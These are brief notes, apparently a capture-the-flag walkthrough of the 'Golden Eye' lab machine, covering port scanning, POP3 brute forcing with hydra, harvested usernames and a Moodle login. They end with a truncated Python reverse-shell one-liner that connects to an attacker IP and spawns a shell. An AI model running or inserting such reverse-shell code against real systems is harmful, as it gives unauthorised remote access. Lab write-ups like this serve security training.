# Golden Eye

## Enumeration

### Namp scan

scan result is here [scan](nmap/all_port)

### http Enumeration

- username
- login creds
  
### Pop 3 numeration

- telnet
- hydra brute force
- boris@ubuntu, natalya@ubuntu, alec@janus.boss [read msg]
- hostname : severnaya-station.com

### Moodle App Enumeration

- Dr Doak
- creds

## Exploitaion

### Rshell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.9.183",3301));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]
